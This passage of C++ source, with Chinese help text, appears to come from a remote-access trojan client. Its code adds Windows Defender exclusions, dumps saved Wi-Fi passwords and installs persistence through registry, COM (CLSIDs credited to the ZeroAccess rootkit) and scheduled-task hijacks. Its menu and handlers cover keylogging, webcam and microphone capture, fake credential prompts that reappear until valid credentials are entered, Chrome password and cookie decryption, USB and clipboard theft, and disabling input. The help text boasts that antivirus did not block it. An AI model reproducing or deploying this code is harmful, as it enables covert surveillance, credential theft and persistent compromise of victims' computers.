            if (!args_f.compare("")) args_h = 1;
            if (args_h) return "\n参数：\n-f 指定Defender排除项路径\n";
            script = "powershell -Command \"Add-MpPreference -ExclusionPath \\\""+args_f+"\\\"\"";
        }
        else if (!cmd.compare("wifi_password")) {
            string buf = this->command((char*)"netsh wlan show profiles|findstr 所有");
            //先执行命令列出所有ssid profile，然后逐个提取ssid查看
            smatch m;
            regex e("\\S+\\s+:\\s+([\\S\ ]+)");
            regex_search(buf, m, e);
            sregex_iterator iter(buf.begin(), buf.end(), e);
            sregex_iterator end;
            while (iter != end)
            {
                string ssid = (*iter)[1];
                string c = "netsh wlan show profiles name=\"" + ssid + "\" key=clear";
                //执行命令查看这个ssid profile是否包含密码
                string output = this->command((char*)c.data());
                int pos = output.find("关键内容");
                //find中文会出现超乎预料的数字，限制为>0&&<size()，即找到了
                if ((pos>0)&&(pos < output.size())) message += output;
                iter++;
            }
            return message;
        }
        else if (!cmd.compare("hijack")) {
            if (!args_m.compare("1")) {
                string UWPname = this->command((char*)"powershell -Command \"Get-AppxPackage |select packagefullname|findstr Cortana\"");
                UWPname = UWPname.replace(UWPname.find("\n"), 1, "");
                script = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\PackagedAppXDebug\\";
                script += UWPname;
                script += " /d \""+args_f+"\" /f 2>&1";
            }
            else if (!args_m.compare("2")) {
                string UWPname = script += this->command((char*)"powershell -Command \"Get-AppxPackage |select packagefullname|findstr People_\"");
                UWPname = UWPname.replace(UWPname.find("\n"),1, "");
                script = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\PackagedAppXDebug\\";
                script += UWPname;
                script += " /d \"" + args_f + "\" /f 2>&1";
            }
            else if (!args_m.compare("3")) {
                script = "netsh add helper "+args_d;
            }
            else if (!args_m.compare("4")) {
                script = "reg add \""+args_t+"\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls\" /t REG_SZ /d \""+args_d+"\" /f 2>&1";
            }
            else if (!args_m.compare("5")) {
                script = "reg add \"hkcu\control panel\desktop\" /v SCRNSAVE.EXE /d \""+args_f+"\" /f 2>&1";
            }
            else if (!args_m.compare("6")) {
                script = "powershell -Command \"echo 'Start-Process \""+args_f+"\"' > $profile\"";
                if (this->command((char*)script.data()).compare("")) return "执行完毕";
            }
            else if (!args_m.compare("7")) {
                script = "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient /v DllName /t REG_SZ /d \""+args_d+"\" /f 2>&1";
            }
            else if (!args_m.compare("8")) {
                script = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\SFBD\" /v Command /t REG_SZ /d \""+args_f+"\" /f 2>&1 &";
                script += "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\SFBD\" /v Nightly /t REG_DWORD /d 1 /f 2>&1 &";
                script += "schtasks /change /enable /tn \"\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser\" &";
                script += "schtasks /change /ri 5 /tn \"\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser\" &";
                script += "schtasks /run /tn \"\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser\" &";
            }
            else args_h = 1;

            if (args_h) {
                message = "\n参数：\n-m 指定选项\n\t1：Cortana（小娜）\n\t2：People（人脉）\n\t3：netsh\n\t";
                message += "4：控制面板\n\t5：屏保程序\n\t6：powershell\n\t7：时间提供者\n\t8：微软兼容性遥测服务\n";
                message += "-f 指定要执行的exe（适用选项1/2/5/6/8）\n-d 指定要加载执行的dll（适用选项3/4/7）\n";
                message += "-t (HKCU/HKLM) 指定要在哪个注册表中执行（适用选项4）\n";
                message += "\n注意：\n选项1会造成小娜无法正常使用\n选项4的dll要改名为cpl后缀\n选项7需要管理员权限\n";
                message += "测试期间杀软未拦截操作\n";
                return message;
            }
        }
        else if (!cmd.compare("com")) {
            if (!args_m.compare("1")) {
                script = "reg add "+args_t+"\\SOFTWARE\\Classes\\CLSID\\{0358b920-0ac7-461f-98f4-58e32cd89148}\\InProcServer32 /t REG_EXPAND_SZ /d \""+args_d+"\" /f 2>&1";
            }
            else if (!args_m.compare("2")) {
                script = "reg add "+args_t+"\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1} /t REG_EXPAND_SZ /d \"" + args_d + "\" /f 2>&1 &";
                script += "reg add "+args_t+"\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1} /v ThreadingModel /t REG_SZ /d Apartment /f 2>&1";
            }
            else if (!args_m.compare("3")) {
                script = "reg add " + args_t + "\\Software\\Classes\\CLSID\\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\\InprocServer32 /t REG_EXPAND_SZ /d \""+args_d+"\" /f 2>&1 ";
            }
            else if (!args_m.compare("4")) {
                script += "reg add " + args_t + "\\Software\\Classes\\CLSID\\{fbeb8a05-beee-4442-804e-409d6c4515e9}\\InprocServer32 /t REG_EXPAND_SZ /d \""+args_d+"\" /f 2>&1 &";
                script += "reg add "+args_t+"\\Software\\Classes\\CLSID\\{fbeb8a05-beee-4442-804e-409d6c4515e9}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Both /f 2>&1";
            }
            else if (!args_m.compare("5")) {
                script = "reg add " + args_t + "\\SOFTWARE\\Classes\\CLSID\\{58fb76b9-ac85-4e55-ac04-427593b1d060}\\InProcServer32 /t REG_EXPAND_SZ /d \"" + args_d + "\" /f 2>&1";
            }
            else args_h = 1;

            if (args_h) {
                message = "\n参数：\n-m 指定选项\n\t1：{0358b920-0ac7-461f-98f4-58e32cd89148}（CacheTask）\n\t2：{42aedc87-2188-41fd-b9a3-0c966feabec1}（MruPidlList）\n\t";
                message += "3：{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}（未知，来自ZeroAccess rootkit）\n\t4：{fbeb8a05-beee-4442-804e-409d6c4515e9}（未知，来自ZeroAccess rootkit）";
                message += "\n\t5：{58fb76b9-ac85-4e55-ac04-427593b1d060}（计划任务UserTask）\n-d 指定要加载执行的dll\n-t (HKCU/HKLM) 指定要在哪个注册表中执行\n";
                message += "\n注意：\n选项1在登录期间默认启动\n选项2在启动explorer.exe时由shell32.dll加载\n选项3/4未知组件，来自ZeroAccess rootkit中的操作，据说选项4也能劫持explorer\n";
                return message;
            }
        }
        else if (!cmd.compare("reccom")) {
            if (!args_m.compare("1")) {
                script = "reg add " + args_t + "\\SOFTWARE\\Classes\\CLSID\\{0358b920-0ac7-461f-98f4-58e32cd89148}\\InProcServer32 /t REG_EXPAND_SZ /d ^%systemroot^%\\system32\\wininet.dll /f 2>&1";
            }
            else if (!args_m.compare("2")) {
                script = "reg add " + args_t + "\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1} /t REG_EXPAND_SZ /d ^%SystemRoot^%\\system32\\windows.storage.dll /f 2>&1 &";
                script += "reg add " + args_t + "\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1} /v ThreadingModel /t REG_SZ /d Apartment /f 2>&1";
            }
            else if (!args_m.compare("3")) {
                script = "reg add " + args_t + "\\Software\\Classes\\CLSID\\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\\InprocServer32 /t REG_EXPAND_SZ /d ^%systemroot^%\\system32\\wbem\\wbemess.dll /f 2>&1 ";
            }
            else if (!args_m.compare("4")) {
                script = "reg add " + args_t + "\\Software\\Classes\\CLSID\\{fbeb8a05-beee-4442-804e-409d6c4515e9}\\InprocServer32 /t REG_EXPAND_SZ /d ^%SystemRoot^%\\system32\\shell32.dll /f 2>&1 &";
                script += "reg add " + args_t + "\\Software\\Classes\\CLSID\\{fbeb8a05-beee-4442-804e-409d6c4515e9}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Both /f 2>&1";
            }
            else if (!args_m.compare("5")) {
                script = "reg add " + args_t + "\\SOFTWARE\\Classes\\CLSID\\{58fb76b9-ac85-4e55-ac04-427593b1d060}\\InProcServer32 /t REG_EXPAND_SZ /d ^%systemroot^%\\system32\\dimsjob.dll /f 2>&1";
            }
            else args_h = 1;

            if (args_h) {
                message = "\n参数：\n-m 指定要恢复的选项\n\t1：{0358b920-0ac7-461f-98f4-58e32cd89148}（CacheTask）\n\t2：{42aedc87-2188-41fd-b9a3-0c966feabec1}（MruPidlList）\n\t";
                message += "3：{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}（未知，来自ZeroAccess rootkit）\n\t4：{fbeb8a05-beee-4442-804e-409d6c4515e9}（未知，来自ZeroAccess rootkit）";
                message += "\n\t5：{58fb76b9-ac85-4e55-ac04-427593b1d060}（计划任务UserTask）\n-t (HKCU/HKLM) 指定要在哪个注册表中执行\n";
                return message;
            }
        }

        //执行命令，并返回结果
        return this->command((char*)script.data());
    }


    string cmd_func(string SFcmd) {
        string message;
        string cmd = text_substr(SFcmd, " ", 1);

        cout << cmd << endl;
        //传递的参数
        int args_h = 0;
        string args_f;
        string args_t;
        string args_i;
        int args_c = 1;
        string args_s;
        string args_m;
        string args_p;
        string args_d;
        int argc = text_substr_count(SFcmd, " ");

        for (int i = 2; i <= argc; i++) {
            string arg = text_substr(SFcmd, " ", i);
            if (!arg.compare("-h")) args_h = 1;
            if (!arg.compare("-f")) args_f = text_substr(SFcmd, " ", i + 1);
            if (!arg.compare("-t")) args_t = text_substr(SFcmd, " ", i + 1);
            if (!arg.compare("-i")) args_i = text_substr(SFcmd, " ", i + 1);
            if (!arg.compare("-c")) args_c = atoi(text_substr(SFcmd, " ", i + 1).data());
            if (!arg.compare("-s")) args_s = text_substr(SFcmd, " ", i + 1);
            if (!arg.compare("-m")) args_m = text_substr(SFcmd, " ", i + 1);
            if (!arg.compare("-p")) args_p = text_substr(SFcmd, " ", i + 1);
            if (!arg.compare("-d")) args_d = text_substr(SFcmd, " ", i + 1);
        }

        for (int i = 1; i<args_c+1; i++) {
            if (!cmd.compare("help")) {
                message = "\nfunc作用域 -- 内置命令列表：\n";
                message += "\thelp\t\t\t列出所有内置命令及说明\n";
                message += "\tscreenshot\t\t捕获当前屏幕截图\n";
                message += "\tscreen\t\t\t录制本地屏幕\n";
                message += "\tcamera\t\t\t调用摄像头进行拍照\n";
                message += "\tvideo\t\t\t调用摄像头录制视频\n";
                message += "\trecord\t\t\t调用麦克风进行录音\n";
                message += "\tlb_record\t\t录制本地音频\n";
                message += "\tkeylogger\t\t详细的键盘记录器\n";
                message += "\twindows\t\t\t持续监控处于前台的窗口信息\n";
                message += "\tdrives\t\t\t监控新增的磁盘，复制指定文件\n";
                message += "\trecyclebin\t\t监控回收站的变化并备份新增文件\n";
                message += "\tclip\t\t\t监控剪贴板，备份文本/图像/文件\n";
                message += "\tprompt_auth\t\t弹出凭据验证窗口尝试钓鱼捕获凭据\n";
                message += "\tchrome\t\t\t解密Chrome浏览器中保存的凭据/Cookie\n";
                message += "\thost_scan\t\t多线程Ping扫描/端口扫描\n";
                message += "\tinstalled\t\t列出电脑上已安装的程序清单\n";
                message += "\tsendkeys\t\t批量发送按键\n";
                message += "\tchange_ico\t\t更改程序/快捷方式的图标\n";
                message += "\tplay_audio\t\t播放wav格式音频文件\n";
                message += "\tvolume\t\t\t获取音量、设置音量和静音\n";
                message += "\tvolume_joke\t\t循环设置音量最大并取消静音\n";
                message += "\tdisable\t\t\t禁用键盘鼠标\n";
                message += "\tlight\t\t\t检查并设置显示器亮度\n";
                message += "\tadduser\t\t\t通过Win32API创建普通用户\n";
                message += "\taddgroup\t\t通过Win32API添加用户到用户组\n";
                message += "\tdeluser\t\t\t通过Win32API删除用户\n";
                message += "\tsetuser\t\t\t通过Win32API更改用户密码/用户名\n";
                message += "\tlocalbrute\t\t通过尝试修改密码来爆破本地用户弱密码\n";
                message += "\tlockscreen\t\t设置电脑锁屏\n";
                message += "\tswap_mouse\t\t反转鼠标左右键\n";
                message += "\tsleep\t\t\t设置电脑睡眠或休眠\n";
                message += "\tshutdown\t\t设置电脑注销或关机\n";
                message += "\tmessagebox\t\t弹窗，自定义文字\n";
                message += "\tbackground\t\t修改电脑壁纸\n";
                message += "\n可以通过 -h 参数获取进一步的帮助\n";
                message += "\n注意：大部分命令都有默认参数将直接执行，务必先查看help\n\n";
                return message;
            }
            else if (!cmd.compare("screenshot")) {
                if (args_h) {
                    message = "\n简介：\n获取屏幕截图，生成bmp格式图像文件\n\n";
                    message += "\n参数：\n-f 指定图像文件名，默认为sf.bmp\n";
                    message += "-c 重复执行本模块几次，默认1\n";
                    return message;
                }
                if (!args_f.compare("")) args_f = "sf.bmp";

                bool status = ScreenShot(args_f);
                if (status) message = "截图创建成功，文件名： " + args_f + "\n";
                else message = "截图创建失败，请重试！";
            }
            else if (!cmd.compare("keylogger")) {
                if (args_h) {
                    message = "\n简介：\n键盘记录器，这个模块将记录捕获按键时的窗口及按下的键值\n\n";
                    message += "\n参数：\n-s 指定间隔时长(毫秒)，可减少爆破按键的频次，默认50\n";
                    message += "-i 判断是否为连续按键（即单词分隔）的时长(毫秒)，默认1000\n";
                    message += "-t 指定监控时长(分钟)（约等于），默认60\n";
                    message += "-f 指定日志文件名，默认为key.log\n";
                    message += "-c 重复执行本模块几次，默认1\n";
                    return message;
                }
                if (!args_s.compare("")) args_s = "50";
                if (!args_i.compare("")) args_i = "1000";
                if (!args_t.compare("")) args_t = "60";
                if (!args_f.compare("")) args_f = "key.log";
                keylogger(atoi(args_s.data()), atoi(args_i.data()), atoi(args_t.data()), args_f);
            }
            else if (!cmd.compare("windows")) {
                if (args_h) {
                    message = "\n简介：\n持续监控活动窗口标题，这个模块将持续记录处于前台的窗口标题/进程名/PID以及时间戳\n\n";
                    message += "\n参数：\n-s 指定检测窗口的间隔时长(秒)，默认1\n";
                    message += "-t 指定监控时长(分钟)（约等于），默认1440（24小时）\n";
                    message += "-f 指定日志文件名，默认为Windows.log\n";
                    message += "-c 重复执行本模块几次，默认1\n";
                    return message;
                }
                if (!args_s.compare("")) args_s = "1";
                if (!args_t.compare("")) args_t = "1440";
                if (!args_f.compare("")) args_f = "Windows.log";
                Monitor_Window_Title(atoi(args_t.data()), atoi(args_s.data()), args_f);
            }
            else if (!cmd.compare("sendkeys")) {
                int size = text_substr_count(SFcmd, " ");
                if (size < 3) {
                    message = "\n简介：\n批量发送按键\n\n\n细节：\n比如91为左win键，091为松开左win键，s100为睡眠100毫秒；";
                    message += "比如[a-z][0-9]这些键不需要发送松开键消息\n\n";
                    message += "\n使用：sendkeys <-i interval> [script]\n";
                    message += "参数：-i 指定每个键值执行之间的延迟（毫秒），默认1000\n";
                    message += "示例：func::sendkeys -i 1000 18 9 018 s2000 91 82 091 s1000\n";
                    message += "含义：按alt+tab;睡眠2s;按win+r;睡眠1s\n\n\n";
                    message += "键值列表：\n键值\t含义\n1\t鼠标左键\n2\t鼠标右键\n3\t控制中断处理\n4\t鼠标中键（三键鼠标）\n5\tX1 鼠标按键\n6\tX2 鼠标按键\n7\t未定义的\n8\t退格键\n9\tTAB 键\n10-11\t保留的\n12\t清除键\n13\t回车键\n14-15\t未定义的\n16\tSHIFT 键\n17\tCTRL 键\n18\tALT键\n19\t暂停键\n20\t大写锁定键\n21\t输入法假名模式/输入法韩文模式\n22\t输入法开启\n23\t输入法Junja 模式\n24\t输入法最终模式\n25\t输入法朝鲜汉字模式/输入法日本汉字模式\n26\t输入法关闭\n27\tESC键\n28\t输入法转换\n29\t输入法未转换\n30\t输入法接受\n31\t输入法模式更改请求\n32\t空格键\n33\t向上翻页键\n34\t向下翻页键\n35\t结束键\n36\tHOME键\n37-40\t左、上、右、下键\n41\t选择键\n42\t打印键\n43\t执行键\n44\t截屏键\n45\tINS键\n46\t删除键\n47\t帮助键\n48-57\t0-9键\n58-64\t未定义的\n65-90\tA-Z键\n91\t左 Windows 键（自然键盘）\n92\t右 Windows 键（自然键盘）\n93\t应用程序键（自然键盘）\n94\t保留的\n95\t电脑睡眠键\n96-105\t数字键盘0-9键\n106\t乘号键\n107\t加号键\n108\t除号键\n109\t减号键\n110\t十进制键\n111\t分割键\n112-135\tF1-F24键\n136-143\t未定义的\n144\t小键盘锁定键\n145\t滚动锁定键\n146-150\tOEM 专用\n151-159\t未定义的\n160\t左 SHIFT 键\n161\t右 SHIFT 键\n162\t左控制键\n163\t右控制键\n164\t左菜单键\n165\t右菜单键\n166\t浏览器返回键\n167\t浏览器前进键\n168\t浏览器刷新键\n169\t浏览器停止键\n170\t浏览器搜索键\n171\t浏览器收藏夹键\n172\t浏览器开始和主页键\n173\t音量静音键\n174\t降低音量键\n175\t音量调高键\n176\t下一曲目键\n177\t上一曲目键\n178\t停止播放键\n179\t播放/暂停媒体键\n180\t开始邮件键\n181\t选择媒体键\n182\t启动应用程序 1 键\n183\t启动应用程序 2 键\n184-185\t保留的\n186\t用于杂字符；它可以因键盘而异。对于美国标准键盘，';:'键\n187\t对于任何国家/地区，'+'键\n188\t对于任何国家/地区，','键\n189\t对于任何国家/地区，'-'键\n190\t对于任何国家/地区，'.' 键\n191\t用于杂字符；它可以因键盘而异。对于美国标准键盘，'/?'键\n192\t用于杂字符；它可以因键盘而异。对于美国标准键盘，'`~' 键\n193-215\t保留的\n216-218\t未定义的\n219\t用于杂字符；它可以因键盘而异。对于美国标准键盘，'[{' 键\n220\t用于杂字符；它可以因键盘而异。对于美国标准键盘，'\|' 键\n221\t用于杂字符；它可以因键盘而异。对于美国标准键盘，']}' 键\n222\t用于杂字符；它可以因键盘而异。对于美国标准键盘，“单引号/双引号”键\n223\t用于杂字符；它可以因键盘而异。\n224\t保留的\n225\tOEM 专用\n226\tRT 102 键键盘上的尖括号键或反斜杠键\n227-228\tOEM 专用\n229\t输入法处理键\n230\tOEM 专用\n231\t用于传递 Unicode 字符，就好像它们是击键一样。用于非键盘输入法的 32 位虚拟密钥值的低位字。\n232\t未定义的\n233-245\tOEM 专用\n246\tAttn键\n247\tCrSel键\n248\t退出键\n249\t擦除 EOF 键\n250\t播放键\n251\t缩放键\n252\t保留的\n253\tPA1 键\n254\t清除键\n\n";
                    return message;
                }
                if (!args_i.compare("")) args_i = "1000";

                queue<string> keys;
                for (int i = 2; i < size + 1; i++) {
                    string key = text_substr(SFcmd, " ", i);
                    if (!key.compare("-i")) i += 1;
                    else keys.push(key); 
                }
                Send_Keys(keys, atoi(args_i.data()));
            }
            else if (!cmd.compare("change_ico")) {
                if (!args_i.compare("")) {
                    message = "\n简介：\n更改程序或快捷方式的图标，这个模块可以批量设置单个文件夹内的所有程序和快捷方式的图标，也可以单独指定\n\n";
                    message += "\n参数：\n-m 指定模式\n\t1\t单独设置exe文件\n\t2\t单独设置快捷方式文件\n\t3\t批量设置文件夹内所有\n";
                    message += "-i 指定ico文件的路径\n";
                    message += "-f 指定exe文件/快捷方式文件的路径\n";
                    message += "-t 指定要批量处理图标的目标文件夹路径\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "示例：\n单独设置exe文件图标\nfunc::monitor_windows -m 1 -f c:\\test\\a.exe -i c:\\test\\test.ico\n";
                    message += "单独设置lnk文件图标\nfunc::monitor_windows -m 2 -f c:\\test\\a.lnk -i c:\\test\\test.ico\n"; 
                    message += "批量设置文件夹内图标\nfunc::monitor_windows -m 3 -t c:\\test\\ -i c:\\test\\test.ico\n";
                    message += "\n注意事项：\n1.该模块目前只能在编译为x86程序时使用\n";
                    message += "2.一个程序默认有很多个不同大小的图标，如果没有显示图标请多设置几个不同大小的图标来替换\n";
                    message += "3.exe重复设置图标可能会出现问题\n\n";
                    return message;
                }
                
                if (!args_m.compare("1")) message += Change_exe_icon(args_f, args_i)+"\n";
                else if (!args_m.compare("2")) message += Change_lnk_icon(args_f, args_i)+"\n";
                else if (!args_m.compare("3")) message += Batch_Set_Icon(args_t, args_i);
            }
            else if (!cmd.compare("play_audio")) {
                if (!args_f.compare("")) {
                    message = "\n简介：\n播放wav格式音频文件\n\n";
                    message += "\n参数：\n-m 指定模式\n\t1\t异步播放，默认选项\n\t2\t停止播放\n\t3\t循环异步播放\n\t4\t同步播放\n";
                    message += "-f 指定wav音频文件路径\n";
                    message += "-c 重复执行本模块几次，默认1\n";
                    return message;
                }
                if (!args_m.compare("")) args_m = "1";
                Play_Audio(atoi(args_m.data()), args_f);
            }
            else if (!cmd.compare("volume")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以检查当前的主音量，设置主音量，设置主音量静音，取消主音量静音\n\n";
                    message += "\n参数：\n-m 指定模式\n\t1\t获取主音量，默认选项\n\t2\t设置主音量\n\t3\t设置静音\n\t4\t取消静音\n";
                    message += "-s 指定音量大小，设置范围为0.00 - 1.00 （仅模式2需要），默认1.00即100音量\n";
                    message += "-c 重复执行本模块几次，默认1\n";
                    return message;
                }
                if (!args_m.compare("")) args_m = "1";
                if (!args_s.compare("")) args_s = "1.00";
                message += Set_MasterVolume(atoi(args_m.data()),atof(args_s.data())) + "\n";
            }
            else if (!cmd.compare("volume_joke")) {
                if (args_h) {
                    message = "\n简介：\n这个模块根据模块volume衍生，无需设置任何参数，效果为循环设置取消静音和设置音量为100，无法停止\n\n";
                    return message;
                }
                Volume_Joke();
            }
            else if (!cmd.compare("lb_record")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以环回录音，即录制本地音频播放器中的声音，生成wav格式音频文件\n\n";
                    message += "\n参数：\n-f 指定音频文件名（默认为lb_record.wav）\n";
                    message += "-t 指定录制时长（秒），默认600（10分钟）\n";
                    message += "-c 重复执行本模块几次，默认1\n";
                    return message;
                }
                if (!args_f.compare("")) args_f = "lb_record.wav";
                if (!args_t.compare("")) args_t = "600";
                AudioCapture capture(args_f, atoi(args_t.data()));
                message += capture.Recording() + "\n";
            }
            else if (!cmd.compare("prompt_auth")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以弹出两种风格的凭据验证窗口（提示当前用户凭据已过期）来钓鱼以欺骗用户输入凭据，";
                    message += "如果输入无效凭据或者取消则无限重复弹出直到接收有效凭据\n\n";
                    message += "\n参数：\n-m 指定不同窗口风格\n\t1\twin7及之前版本的窗口风格\n\t2\twin10的窗口风格，默认选项\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "\n注意事项：\n1.弹出的验证窗口已经内置了欺骗性文字，但是为中文，切勿在英文版系统钓鱼（懒得开放自定义文本）\n";
                    message += "2.验证凭据的方式是通过尝试登录用户完成的，将在登录日志上留下痕迹\n";
                    message += "3.新版旧版的凭据验证窗口都可以在win10上运行，但使用旧版（日常使用不会出现）可信度降低\n\n";
                    return message;
                }
                if (!args_m.compare("2")) message += Prompt_New_WindowsAuth();
                else message += Prompt_Old_WindowsAuth();
            }
            else if (!cmd.compare("chrome")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以解密Chorme浏览器中保存的凭据（网页填写表格中的保存密码）";
                    message += "和Cookie（版本<80，新版本的Cookies采用了新的加密算法）\n\n";
                    message += "\n参数：\n-m 指定解密模式\n\t1\t解密保存的凭据，默认选项\n\t2\t解密cookie（版本<80）\n";
                    message += "-f 指定要解密的\"Login Data\"或\"Cookies\"文件，默认搜寻Chrome默认安装位置\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "\n注意事项：\n1.默认搜寻位置为 C:\\Users\\%UserName%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\\n";
                    message += "2.由于这些文件不能在Chrome运行时读取，所以使用默认选项时将复制到 C:\\Windows\\Temp\\ 文件夹中读取\n";
                    message += "3.解密Cookies一般来说输出较多请在执行程序时使用--bufsize调整缓冲区的大小\n";
                    message += "4.Chrome数据文件使用sqlite3数据库格式存储，此程序只使用了x64版本的sqlite3库，如果要编译为x86自行替换文件即可\n\n\n";
                    return message;
                }
                if (!args_m.compare("2")) message += Get_Old_Chrome_Cookies(args_f);
                else message += Get_Chrome_Password(args_f);
            }
            else if (!cmd.compare("host_scan")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以发送ICMP包探测存活主机，通过SOCKET连接探测开放端口，多线程扫描\n\n";
                    message += "\n参数：\n-m 指定扫描模式\n\t1\t扫描存活IP，默认选项\n\t2\t扫描开放端口\n";
                    message += "-i 指定要扫描的目标IP范围\n\t示例：\n\t扫描A段\n\t1.0.0.0/8\n\t扫描B段\n\t1.1.0.0/16\n\t";
                    message += "扫描C段\n\t192.168.1.0/24\n\t多网段\n\t192.168.1.0/24-192.168.2.0/24\n\t192.167.0.0/16-192.168.0.0/16";
                    message += "\n\t指定IP范围\n\t192.168.1.20-192.168.2.100\n";
                    message += "-p 指定端口范围（仅模式2需要），示例：1-1000，默认1-1000\n";
                    message += "-s 设置超时时间（毫秒），默认1000（1秒）\n";
                    message += "-t 指定线程数，默认3\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "\n注意事项：\n1.-s参数在端口扫描时候可以设置为浮点数以修正时间单位为微秒\n";
                    message += "2.多线程基于IP数量进行负载分担，控制线程数小于IP数量\n\n";
                    return message;
                }
                if (!args_m.compare("")) args_m = "1";
                if (!args_p.compare("")) args_p = "1-1000";
                if (!args_s.compare("")) args_s = "1000";
                if (!args_t.compare("")) args_t = "3";

                string output;
                message += Host_Scan(atoi(args_m.data()), args_i, args_p, output, atof(args_s.data()), atoi(args_t.data()))+"\n";
                message += output + "\n";
            }
            else if (!cmd.compare("drives")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以持续监控新增的磁盘，检测到新磁盘时首先执行tree命令导出文件结构方便搜寻需要监控的文件名";
                    message += "并留下磁盘插入的时间戳日志，指定要复制的文件名列表后，等待下次新磁盘插入时将逐个尝试复制文件\n\n";
                    message += "\n参数：\n-f 指定要复制的文件路径（去掉盘符的绝对路径，用|隔开）\n\t";
                    message += "示例：-f secret\\username.txt|secret\\password.txt\n";
                    message += "-t 指定监控时长（分钟），默认24小时\n";
                    message += "-s 指定检测间隔（秒），默认1\n";
                    message += "-d 指定备份文件夹（存在的），默认在当前文件夹\n\t示例：backup\\\n";
                    message += "-i 指定检测新磁盘插入事件的日志文件名，默认为Drive.log\n";
                    message += "-p 指定tree命令输出的文件名，默认为tree.log\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "\n注意事项：\n1.根据预期，应该在第一次使用的时候查看tree命令输出搜寻想要备份的文件，在第二次执行时才指定文件名进行监测备份\n";
                    message += "2.对于文件比较多的磁盘，tree命令将花费很久很久，不能在预定时间内完成是正常的（该模块的预期是监测u盘/读卡器等容量较小的存储设备）\n\n";
                    return message;
                }
                if (!args_t.compare("")) args_t = "1440";
                if (!args_s.compare("")) args_s = "1";
                if (!args_i.compare("")) args_i = "Drive.log";
                if (!args_p.compare("")) args_p = "tree.log";

                vector<string> files;
                if (args_f.compare("")) {
                    for (int i = 0; i < text_substr_count(args_f, "|"); i++) {
                        string filename = text_substr(args_f, "|", i + 1);
                        files.push_back(filename);
                    }
                }
                Monitor_New_Drive(files,true,atoi(args_t.data()),atoi(args_s.data()),args_d,args_i,args_p);
            }
            else if (!cmd.compare("recyclebin")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以监控当前用户桌面所在盘符下的回收站变化并记录且备份新出现的文件\n\n";
                    message += "\n参数：\n-t 指定监控时长（分钟），默认24小时\n";
                    message += "-s 指定监测间隔（秒），默认1\n";
                    message += "-d 指定备份文件夹（存在的），默认在当前文件夹\n\t示例：backup\\\n";
                    message += "-f 指定日志文件名，默认为RecycleBin.log\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }
                if (!args_t.compare("")) args_t = "1440";
                if (!args_s.compare("")) args_s = "1";
                if (!args_f.compare("")) args_f = "RecycleBin.log";
                Monitor_Recycle_Bin(atoi(args_t.data()), atoi(args_s.data()), args_d, args_f);
            }
            else if (!cmd.compare("clip")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以持续监控剪贴板，记录复制的文字，备份复制的图像/文件\n\n";
                    message += "\n参数：\n-t 指定监控时长（分钟），默认30分钟\n";
                    message += "-s 指定监测间隔（毫秒），默认5000（5秒）\n";
                    message += "-m 指定模式\n\t1\t仅检索当前剪贴板文本，默认选项\n\t2\t持续监控剪贴板\n";
                    message += "-p 指定备份文件的大小阀值（kb），默认102400（100M）\n";
                    message += "-f 指定日志文件名，默认为clip.log\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "注意：捕获的图像保存文件名预定义为1.bmp-[n].bmp，捕获的文件存储在dir1-dir[n]文件夹中，";
                    message += "日志将保存捕获的文本以及保存文件信息\n\n";
                    return message;
                }
                if (!args_t.compare("")) args_t = "30";
                if (!args_s.compare("")) args_s = "5000";
                if (!args_p.compare("")) args_p = "102400";
                if (!args_f.compare("")) args_f = "clip.log";

                if (!args_m.compare("2")) clip_monitor(args_f, atoi(args_t.data()), atoi(args_s.data()), atoi(args_p.data()));
                else message += GetClipLine();
            }
            else if (!cmd.compare("disable")) {
                if (args_h) {
                    message = "\n简介：\n这个模块安装低级钩子HOOK关于鼠标键盘的所有消息并返回已处理达到禁用键盘鼠标的目的\n\n";
                    message += "\n参数：\n-t 指定禁用时长（秒），默认120（2分钟），指定为0则时长为无限\n";
                    message += "-m 指定模式\n\t1\t禁用键盘，默认选项\n\t2\t禁用鼠标\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "注意事项：\n1.如果要同时禁用键盘和鼠标可以开两个客户端连接一个禁用键盘一个禁用鼠标\n";
                    message += "2.-t参数固定误差晚一秒左右\n";
                    return message;
                }
                if (!args_t.compare("")) args_t = "120";
